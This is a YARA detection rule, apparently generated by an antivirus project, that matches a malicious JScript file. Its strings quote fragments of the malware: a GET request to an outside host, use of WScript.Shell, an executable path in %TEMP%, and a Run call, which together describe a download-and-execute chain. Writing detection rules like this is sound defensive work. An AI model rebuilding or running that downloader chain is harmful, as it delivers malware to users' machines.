rule sig_20160330_ccea039f57f9b3294f7247ba7cdb6574 {
  meta:
    description = "datamaliciousorder - file 20160330_ccea039f57f9b3294f7247ba7cdb6574.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d828f873a1e8897353dd7b5c40ec5d8aba717171216ad38369639962574651ba"

  strings:
    $s1  = "_HQ[_T](\"GET\", \"http://susiewest.com/u2w7q\", false);" fullword ascii
    $s2  = "function _VI(_YB, _EJ){_M = _M * 1; return _YB - _EJ;};" fullword ascii
    $s3  = "var _Y0 = function _U() {return WScript[_XO](\"WScript\"+\".Shell\");}(), _L = 11;" fullword ascii
    $s4  = "if (_HQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _PA(){return _P + \"\";};" fullword ascii
    $s6  = "function _F() {return _Y0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"aowOIbdj7jP6.ex\" + \"e\";};" fullword ascii
    $s7  = "function _LI(_W0){_Y0[\"Run\"](_W0, _M, _M);};" fullword ascii
    $s8  = "function _I() {return ((_Y == true) && (_Y == _O)) ? 1 : _M;};" fullword ascii
    $s9  = "var _M0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function _D()" fullword ascii
    $s11 = "function _SY(_T0) {var _U0 = (1, 2, 3, 4, 5, _T0); return _U0;};" fullword ascii
    $s12 = "function _BD(){return 22;};" fullword ascii
    $s13 = "function _DR(){return _XO;};" fullword ascii
    $s14 = " while (_FB){" fullword ascii
    $s15 = "return _VI(_BG, _OP);" fullword ascii
    $s16 = "var _Y = false;" fullword ascii
    $s17 = "var _O = false;" fullword ascii
    $s18 = "_O = true; " fullword ascii
    $s19 = "var _NS = false;" fullword ascii
    $s20 = "_Y = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}